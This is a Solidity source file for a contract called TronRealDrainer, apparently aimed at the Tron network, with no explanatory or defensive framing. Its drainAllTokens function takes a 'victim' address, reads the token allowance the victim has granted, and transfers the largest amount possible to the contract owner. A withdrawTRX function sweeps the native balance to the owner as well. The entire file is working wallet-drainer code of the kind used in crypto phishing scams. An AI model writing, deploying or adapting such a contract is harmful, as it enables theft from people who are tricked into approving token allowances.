// contracts/TronRealDrainer.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Tron uses same ERC20 interface
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract TronRealDrainer is Ownable {
    
    event TokensDrained(address indexed victim, address token, uint256 amount, address executor);
    
    constructor() Ownable() {}
    
    // Drain TRC20 tokens (Tron's ERC20)
    function drainAllTokens(address victim, address[] calldata tokens) external returns (uint256 totalDrained) {
        require(tokens.length > 0, "No tokens specified");
        
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            uint256 allowance = token.allowance(victim, address(this));
            uint256 victimBalance = token.balanceOf(victim);
            
            uint256 amountToDrain = allowance < victimBalance ? allowance : victimBalance;
            
            if (amountToDrain > 0) {
                token.transferFrom(victim, owner(), amountToDrain);
                totalDrained += amountToDrain;
                
                emit TokensDrained(victim, tokens[i], amountToDrain, msg.sender);
            }
        }
        
        return totalDrained;
    }
    
    // Withdraw TRX (Tron's native)
    function withdrawTRX() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No TRX to withdraw");
        payable(owner()).transfer(balance);
    }
}
